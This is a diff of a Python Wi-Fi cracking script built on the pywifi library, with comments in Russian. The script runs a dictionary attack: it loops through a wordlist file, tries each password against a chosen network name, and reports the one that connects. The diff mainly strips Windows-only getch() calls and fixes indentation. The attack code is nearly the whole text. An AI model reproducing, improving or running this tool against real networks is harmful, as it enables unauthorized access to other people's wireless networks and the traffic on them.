@@ -1,5 +1,4 @@
-﻿from msvcrt import getch
-import pywifi #import
+﻿import pywifi #import
 from pywifi import const # const - это некоторые константы, установленные wifi, например, код состояния соответствует 4, сбой равен 0 и т. д.
 import time
 from colorama import Fore
@@ -47,8 +46,7 @@ def crack(password):
                 except:
 
                     print(Fore.RED + "(!ERROR!) " + Fore.WHITE + "=" + Fore.GREEN + " (!Wifi name was not found!)\n" + Fore.WHITE)
-                    getch()
-		    exit(0)
+                    exit(0)
 
                 time.sleep(4)
                 if iface.status() == const.IFACE_CONNECTED:
@@ -56,21 +54,20 @@ def crack(password):
                 else:
                     return False
             else:
-                         print("\nConnection was " + Fore.GREEN + "successful!" + Fore.WHITE)
-                         getch()
-		         exit(0)
+                        print("\nConnection was " + Fore.GREEN + "successful!" + Fore.WHITE)
+                        exit(0)
 
 def read_password():
-                 "" "Прочитать пароль" ""
-                 #print ("Start hack")
+                "" "Прочитать пароль" ""
+                #print ("Start hack")
 
-                 path = pathtxt # Путь к словарю
+                path = pathtxt # Путь к словарю
 
 
-                 try:
+                try:
 
-                     with open (path, "r") as f: # Открыть файл словаря
-                         while True:
+                    with open (path, "r") as f: # Открыть файл словаря
+                        while True:
                             try:
                                 password = f.readline () # читать каждую строку файла
                                 #if password == password:
@@ -80,8 +77,8 @@ def read_password():
                                 boolte = crack(password)
                                 if boolte == True:
                                     print (Fore.GREEN + "Right password!: " + Fore.WHITE + password + "\n") # Если взлом прошел успешно, выходим из программы
-                                    geth()
-				    exit(0)
+
+                                    exit(0)
 
                                 else:
                                        print (Fore.RED + "bad pas: " + Fore.WHITE + password)
@@ -93,11 +90,10 @@ def read_password():
                                 #read_password()
                                 continue
 
-                 except:
+                except:
 
                     print(Fore.RED + "\n(!ERROR!) " + Fore.WHITE + "=" + Fore.GREEN + " (!Txt file or ssid was not found!)\n" + Fore.WHITE)
-                    getch()
-		    exit(0)
+                    exit(0)
 
 def wifi_hack_start():
 
@@ -113,8 +109,7 @@ def wifi_hack_start():
     except:
 
         print(Fore.RED + "\n(!ERROR!) " + Fore.WHITE + "=" + Fore.GREEN + " (!Wifi name or txt file was not found!)\n" + Fore.WHITE)
-        getch()
-	exit(0)
+        exit(0)
 
     print(Fore.RED + "\nEnter 'esc' (for exit)")
     ferdtxt = input(Fore.YELLOW + "Enter path to txt file: " + Fore.WHITE)
@@ -128,8 +123,8 @@ def wifi_hack_start():
     except:
 
         print(Fore.RED + "\n(!ERROR!) " + Fore.WHITE + "=" + Fore.GREEN + " (!Txt file or ssid was not found!)\n" + Fore.WHITE)
-        getch()
-	exit(0)
+
+        exit(0)
 
     read_password()
 
